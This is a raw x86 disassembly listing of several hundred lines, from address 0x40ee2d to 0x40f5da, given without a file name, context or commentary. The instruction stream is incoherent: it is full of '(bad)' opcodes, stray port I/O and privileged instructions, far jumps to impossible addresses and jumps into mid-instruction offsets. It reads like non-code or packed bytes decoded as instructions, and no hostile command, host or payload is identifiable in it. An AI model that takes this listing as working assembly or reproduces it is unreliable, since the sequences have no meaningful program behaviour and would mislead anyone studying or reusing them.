  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
